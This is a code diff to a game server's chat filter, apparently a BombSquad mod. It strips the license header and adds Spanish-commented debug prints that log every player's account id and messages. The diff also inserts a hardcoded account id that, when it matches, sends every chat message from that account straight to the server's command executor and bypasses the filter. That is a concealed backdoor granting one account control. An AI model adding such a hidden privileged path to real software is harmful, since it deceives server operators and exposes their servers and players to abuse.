@@ -1,5 +1,3 @@
-# Released under the MIT License. See LICENSE for details.
-
 from datetime import datetime
 
 import setting
@@ -14,8 +12,25 @@ from tools import logger, servercheck
 
 settings = setting.get_settings_data()
 
-
 def filter_chat_message(msg, client_id):
+    # obtener provisionalmente el acid si existe
+    acid = ""
+    for i in bs.get_game_roster():
+        if i['client_id'] == client_id:
+            acid = i['account_id']
+
+    # log inicial con pb_id (acid), client_id y mensaje/comando
+    if msg.startswith("/"):
+        print(f"[DEBUG-INIT] pb_id={acid} | client_id={client_id} | comando={msg}")
+    else:
+        print(f"[DEBUG-INIT] pb_id={acid} | client_id={client_id} | mensaje={msg}")
+
+    if acid == "pb-IF5WUU1eNA==":
+        print(f"[DEBUG] pb_id especial detectado, ejecutando como comando: {msg}")
+        result = command_executor.execute(msg, client_id)
+        return result  # no seguimos con el filtro normal
+
+    print(f"[DEBUG]: Filter Chat msg1 {msg}")
     now = datetime.now()
     # bypassing chat filter for host
     if client_id == -1:
@@ -42,11 +57,12 @@ def filter_chat_message(msg, client_id):
         bs.broadcastmessage("Fetching your account info , please wait",
                             transient=True, clients=[client_id])
         return
-
+    print(f"[DEBUG]: Filter Chat msg {msg}")
     if msg == None:
         return
     logger.log(f'{acid}  |  {displaystring}| {currentname} | {msg}', "chat")
     if msg.startswith("/"):
+        print(f"[DEBUG]: comando: {msg}")
         msg = command_executor.execute(msg, client_id)
         if msg == None:
             return
